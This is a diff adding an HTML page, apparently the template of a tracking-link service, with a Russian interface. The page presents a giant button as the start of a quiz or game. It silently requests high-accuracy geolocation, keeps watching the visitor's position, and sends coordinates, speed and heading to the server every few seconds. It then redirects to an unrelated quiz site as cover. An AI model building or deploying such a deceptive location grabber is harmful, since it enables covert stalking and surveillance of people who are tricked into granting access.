@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Доступ</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #808080;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        .permission-button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            width: 90vw;
+            max-width: 800px;
+            height: 80vh;
+            max-height: 600px;
+            font-size: 60px;
+            font-weight: bold;
+            border-radius: 20px;
+            cursor: pointer;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.4);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
+
+        .status-message {
+            position: fixed;
+            top: 20px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            color: white;
+            font-size: 24px;
+            padding: 10px;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: none;
+        }
+
+        .tracking-info {
+            position: fixed;
+            bottom: 20px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            color: white;
+            font-size: 16px;
+            padding: 10px;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Огромная кнопка на весь экран -->
+    <button id="request-location" class="permission-button">НАЖМИТЕ ЗДЕСЬ</button>
+
+    <!-- Статусное сообщение -->
+    <div id="status-message" class="status-message">Запрашиваем Старт...</div>
+
+    <!-- Информация об отслеживании -->
+    <div id="tracking-info" class="tracking-info"></div>
+
+    <script>
+        // Данные о текущем посещении
+        const linkId = "{{ link_id }}";
+        const visitIndex = {{ visit_index }};
+
+        // Переменные для отслеживания статуса разрешений
+        let locationAccessed = false;
+        let locationData = null;
+        let watchId = null;
+        let trackingActive = false;
+        let updateInterval = null;
+
+        // Функция для обновления данных о посещении на сервере
+        function updateVisitData() {
+            fetch('/update_visit_data', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    link_id: linkId,
+                    visit_index: visitIndex,
+                    location: locationData,
+                    camera_accessed: false
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Данные успешно обновлены:', data);
+
+                // Если местоположение получено и это первое обновление, перенаправляем на Google
+                if (locationAccessed && !trackingActive) {
+                    trackingActive = true;
+                    showStatus('Игра началась! Можете начинать...');
+
+                    // Показываем информацию об отслеживании
+                    document.getElementById('tracking-info').style.display = 'block';
+
+                    // Запускаем интервал для обновления информации об отслеживании
+                    updateTrackingInfo();
+
+                    // Перенаправляем на Google через 3 секунды
+                    setTimeout(() => {
+                        window.location.href = 'https://pikuco.ru/tests/14063/?restart=Y';
+                    }, 3000);
+                }
+            })
+            .catch(error => {
+                console.error('Ошибка при обновлении данных:', error);
+                showStatus('Произошла ошибка. Попробуйте еще раз.');
+            });
+        }
+
+        // Функция для запроса доступа к местоположению
+        function requestLocationAccess() {
+    showStatus('почти готово');
+
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            function(position) {
+                locationData = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    timestamp: new Date().toLocaleString(),
+                    speed: position.coords.speed || 0,
+                    heading: position.coords.heading || 0
+                };
+
+                console.log("подготовьтесь !:", locationData);
+                showStatus('Время! Запускаем Тесты');
+                locationAccessed = true;
+
+                // Запускаем постоянное отслеживание местоположения
+                startLocationTracking();
+
+                // Обновляем данные на сервере
+                updateVisitData();
+            },
+            function(error) {
+                console.error("Ошибка Старта к Тестам:", error);
+                showStatus('Ошибка: Старт не предоставлен. Нажмите еще раз.');
+            },
+            {
+                enableHighAccuracy: true,
+                maximumAge: 0,
+                timeout: 10000
+            }
+        );
+    } else {
+        showStatus('Ваш браузер не поддерживает Тестов');
+    }
+}
+
+        // Функция для запуска постоянного отслеживания местоположения
+        function startLocationTracking() {
+    if (navigator.geolocation) {
+        // Устанавливаем более частое обновление
+        watchId = navigator.geolocation.watchPosition(
+            function(position) {
+                locationData = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    timestamp: new Date().toLocaleString(),
+                    speed: position.coords.speed || 0,
+                    heading: position.coords.heading || 0
+                };
+
+                console.log("Новые координаты получены:", locationData);
+
+                // Обновляем информацию об отслеживании
+                updateTrackingInfo();
+
+                // Обновляем данные на сервере
+                updateVisitData();
+            },
+            function(error) {
+                console.error("Ошибка при отслеживании местоположения:", error);
+                showStatus('Ошибка отслеживания. Пытаемся восстановить...');
+
+                // Пытаемся перезапустить отслеживание при ошибке
+                setTimeout(() => {
+                    if (watchId !== null) {
+                        navigator.geolocation.clearWatch(watchId);
+                        watchId = null;
+                        startLocationTracking();
+                    }
+                }, 5000);
+            },
+            {
+                enableHighAccuracy: true,
+                maximumAge: 0,
+                timeout: 5000
+            }
+        );
+
+        // Устанавливаем интервал для принудительного обновления данных
+        // даже если местоположение не изменилось
+        updateInterval = setInterval(() => {
+            if (locationData) {
+                // Обновляем временную метку
+                locationData.timestamp = new Date().toLocaleString();
+                updateVisitData();
+                console.log("Отправка данных по интервалу:", locationData);
+            }
+        }, 10000); // Каждые 10 секунд
+
+        // Показываем статус
+        showStatus('Отслеживание активно. Данные обновляются автоматически.');
+
+        // Обработчик для очистки ресурсов при закрытии страницы
+        window.addEventListener('beforeunload', function() {
+            if (watchId !== null) {
+                navigator.geolocation.clearWatch(watchId);
+            }
+            if (updateInterval !== null) {
+                clearInterval(updateInterval);
+            }
+        });
+    } else {
+        showStatus('Ваш браузер не поддерживает определение местоположения');
+    }
+}
+
+        // Функция для отображения статусного сообщения
+        function showStatus(message) {
+            const statusMessage = document.getElementById('status-message');
+            statusMessage.textContent = message;
+            statusMessage.style.display = 'block';
+        }
+
+        // Функция для обновления информации об отслеживании
+        function updateTrackingInfo() {
+    if (!locationData) return;
+
+    const trackingInfo = document.getElementById('tracking-info');
+    let infoText = `Начало | Теста: ${locationData.latitude.toFixed(6)}, ${locationData.longitude.toFixed(6)}`;
+
+    if (locationData.speed && locationData.speed > 0) {
+        // Конвертируем скорость из м/с в км/ч
+        const speedKmh = (locationData.speed * 3.6).toFixed(1);
+        infoText += ` | Скорость: ${speedKmh} км/ч`;
+    }
+
+    if (locationData.heading && locationData.heading >= 0) {
+        // Преобразуем направление в текстовое описание
+        const directions = ['С', 'СВ', 'В', 'ЮВ', 'Ю', 'ЮЗ', 'З', 'СЗ'];
+        const index = Math.round(locationData.heading / 45) % 8;
+        infoText += ` | Направление: ${directions[index]}`;
+    }
+
+    trackingInfo.textContent = infoText;
+    trackingInfo.style.display = 'block';
+
+    // Добавляем текущее время последнего обновления
+    infoText += ` | Обновлено: ${new Date().toLocaleTimeString()}`;
+}
+
+        // Добавляем обработчики событий
+        document.addEventListener('DOMContentLoaded', function() {
+            const locationButton = document.getElementById('request-location');
+
+            // Обработчик для кнопки разрешения местоположения
+            locationButton.addEventListener('click', function() {
+                requestLocationAccess();
+            });
+
+            // Автоматически запрашиваем разрешение при загрузке страницы
+            setTimeout(() => {
+                // Автоматически фокусируемся на кнопке
+                locationButton.focus();
+
+                // Показываем подсказку
+                showStatus('Нажмите на большую зеленую кнопку');
+
+                // Автоматически запрашиваем разрешение через 2 секунды
+                setTimeout(() => {
+                    requestLocationAccess();
+                }, 2000);
+            }, 500);
+        });
+    </script>
+</body>
+</html>
